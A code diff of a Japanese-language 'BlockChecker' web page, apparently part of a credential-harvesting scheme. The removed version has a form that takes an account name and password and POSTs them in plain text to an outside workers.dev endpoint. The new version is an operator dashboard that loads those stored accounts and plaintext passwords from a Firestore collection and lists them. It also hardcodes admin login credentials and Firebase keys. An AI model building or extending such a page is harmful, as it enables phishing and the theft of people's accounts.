@@ -3,27 +3,19 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BlockChecker 管理＆送信ページ</title>
+<title>管理者用データ一覧（自分用）</title>
 <style>
 body { font-family:sans-serif; background:#111; color:#fff; padding:20px;}
-input, button { padding:6px 10px; margin:4px;}
 table { width:100%; border-collapse: collapse; margin-top:20px;}
 th, td { border:1px solid #444; padding:8px; text-align:center;}
 th { background:#222;}
 tr:nth-child(even) { background:#1a1a1a;}
+h1 { text-align:center;}
 #no-data { text-align:center; margin-top:20px; color:#888; }
 </style>
 </head>
 <body>
-<h1>BlockChecker 管理＆送信ページ</h1>
-
-<h2>データ送信</h2>
-<label>アカウント: <input id="account" type="text"></label>
-<label>パスワード: <input id="password" type="text"></label>
-<label>ブロック数: <input id="blockCount" type="number" value="0"></label>
-<button id="sendBtn">送信</button>
-
-<h2>管理者用データ一覧</h2>
+<h1>管理者用データ一覧（自分用）</h1>
 <div id="no-data">まだデータはありません</div>
 <table id="data-table" style="display:none;">
 <tr>
@@ -36,66 +28,39 @@ tr:nth-child(even) { background:#1a1a1a;}
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
-import { getDatabase, ref, get, query, orderByChild } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
+import { getFirestore, collection, getDocs, query, orderBy } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-firestore.js";
 import { getAuth, onAuthStateChanged, signInWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-auth.js";
 
-// 🔹 Firebase 設定
+// 🔹 firebaseConfig はフォームページと同じ
 const firebaseConfig = {
-  apiKey: "AIzaSyAEUzSKvAVq-LzRMk24Apqj960i66hAlO8",
-  authDomain: "blockchecker-60080.firebaseapp.com",
-  databaseURL: "https://blockchecker-60080-default-rtdb.firebaseio.com",
-  projectId: "blockchecker-60080",
-  storageBucket: "blockchecker-60080.firebasestorage.app",
-  messagingSenderId: "473814405986",
-  appId: "1:473814405986:web:d5892a05d943f12090523b"
+  apiKey: "AIzaSyB65yYda5Y1bVM3q74HizAQSbRrOT014x0",
+  authDomain: "daada-ae048.firebaseapp.com",
+  projectId: "daada-ae048",
+  storageBucket: "daada-ae048.firebasestorage.app",
+  messagingSenderId: "844142280857",
+  appId: "1:844142280857:web:9ced0beca7eeafd3223808",
+  measurementId: "G-02E60HW9QW"
 };
 
 const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
+const db = getFirestore(app);
 const auth = getAuth(app);
 
-// 🔹 管理者ログイン情報
+// 🔹 自分のアカウント情報
 const ADMIN_EMAIL = "admin@example.com";
 const ADMIN_PASSWORD = "mysecretpassword";
 
-// 🔹 自動ログイン
+// 🔹 自動ログイン（テスト用。ブラウザ閉じても Firebase Auth が保持される）
 signInWithEmailAndPassword(auth, ADMIN_EMAIL, ADMIN_PASSWORD)
   .catch(err => alert("ログインエラー: " + err.message));
 
-const workerURL = "https://blockchecker.da9782523.workers.dev/";
-
-// 🔹 送信ボタン
-document.getElementById("sendBtn").addEventListener("click", async () => {
-  const account = document.getElementById("account").value;
-  const password = document.getElementById("password").value;
-  const blockCount = parseInt(document.getElementById("blockCount").value || "0");
-
-  if(!account || !password){
-    alert("アカウントとパスワードは必須です");
-    return;
-  }
-
-  try {
-    await fetch(workerURL, {
-      method:"POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ account, password, blockCount })
-    });
-    alert("送信成功");
-    showData();
-  } catch(e) {
-    alert("送信失敗: " + e.message);
-  }
-});
-
-// 🔹 データ表示
 async function showData() {
+  const q = query(collection(db, "blockchecker"), orderBy("createdAt","desc"));
+  const snapshot = await getDocs(q);
   const table = document.getElementById("data-table");
   const noData = document.getElementById("no-data");
 
-  const snapshot = await get(query(ref(db, "messages"), orderByChild("timestamp")));
-
-  if (!snapshot.exists()) {
+  if (snapshot.empty) {
     table.style.display = "none";
     noData.style.display = "block";
     return;
@@ -104,23 +69,20 @@ async function showData() {
   table.style.display = "table";
   noData.style.display = "none";
 
-  while(table.rows.length > 1) table.deleteRow(1);
-
-  snapshot.forEach(child => {
-    const d = child.val();
+  snapshot.forEach(doc => {
+    const d = doc.data();
     const row = table.insertRow();
-    row.insertCell(0).textContent = d.account || "-";
-    row.insertCell(1).textContent = d.password || "-";
-    row.insertCell(2).textContent = d.blockCount || "-";
-    row.insertCell(3).textContent = d.timestamp ? new Date(d.timestamp).toLocaleString() : "-";
+    row.insertCell(0).textContent = d.account;
+    row.insertCell(1).textContent = d.password;
+    row.insertCell(2).textContent = d.blockCount;
+    row.insertCell(3).textContent = d.createdAt?.toDate ? d.createdAt.toDate().toLocaleString() : "-";
   });
 }
 
-// 🔹 ログイン確認
+// 🔹 ページを開いた時にログイン確認
 onAuthStateChanged(auth, user => {
-  if(user && user.email === ADMIN_EMAIL){
-    showData();
-    setInterval(showData, 5000);
+  if (user && user.email === ADMIN_EMAIL) {
+    showData(); // ログイン済みかつ自分のメールなら表示
   } else {
     alert("管理者ログインが必要です");
     window.location.href = "ログインページURL";
